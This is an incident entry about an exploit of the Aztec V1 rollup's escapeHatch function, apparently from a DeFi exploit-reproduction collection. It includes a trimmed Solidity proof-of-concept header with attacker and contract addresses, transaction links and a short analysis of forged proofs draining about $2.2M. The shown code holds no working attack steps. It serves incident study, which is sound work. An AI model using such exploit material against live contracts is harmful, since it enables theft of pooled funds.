# [?] Aztec V1 - escapeHatch Proof-Forgery (permissionless RollupProcessor exit)

## Summary
Severity: Unknown
Chain: Ethereum
Component: AztecEscapeHatch
Published: 2026-06-17
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/AztecEscapeHatch_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$2.2M (1158 ETH + 150,000 DAI + 0.4696 renBTC)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$2.2M (1158 ETH + 150,000 DAI + 0.4696 renBTC)
// Attacker : 0x6952d9246e9afe8b887b2877225163436f78e97f
// Attack Contract : none (attacker EOA calls escapeHatch directly)
// Vulnerable Contract : 0x737901bea3eeb88459df9ef1be8ff3ae1b42a2ba (Aztec V1 rollup)
// Verifier : 0x48cb7ba00d087541dc8e2b3738f80fdd1fee8ce8 (TurboVerifier / Turbo-PLONK)
// Attack Tx (ETH)   : https://etherscan.io/tx/0xab306cd2184d23b6ba3e151b10b3b9a0b81f211cc16f4f3b0c79f0b17a59c2b5
// Attack Tx (DAI)   : https://etherscan.io/tx/0x5c196c37a109d74c9797254287a0331f30e0daa637af241bd28fdc43774705c3
// Attack Tx (renBTC): https://etherscan.io/tx/0x9e1d6ab7c20ae235409d7dd3a9cd47c04f07293585b3498b8beed82d6f6b03ca

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x737901bea3eeb88459df9ef1be8ff3ae1b42a2ba#code

// @Analysis
// The Aztec V1 rollup exposes escapeHatch(bytes proofData, bytes signatures, bytes
// viewingKeys), a permissionless exit that accepts a Turbo-PLONK rollup proof and pays
// out the encoded withdrawal. The attacker submitted proofs the TurboVerifier accepted
// yet that authorized withdrawing the rollup's entire pooled ETH/DAI/renBTC balance to
// an address with no matching deposit, breaking the rollup's value-conservation invariant.
// Each proof is a cryptographic witness bound to the rollup's on-chain roots at its block.

address constant ATTACKER = 0x6952d9246e9aFE8B887B2877225163436F78E97F;
address constant ROLLUP   = 0x737901bea3eeb88459df9ef1BE8fF3Ae1B42A2ba;
address constant DAI       = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
address constant RENBTC    = 0xEB4C2781e4ebA804CE9a9803C67d0893436bB27D;

interface IAztecRollup {
    function escapeHatch(bytes calldata proofData, bytes calldata signatures, bytes calldata viewingKeys) external;
}

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/AztecEscapeHatch_exp.sol_
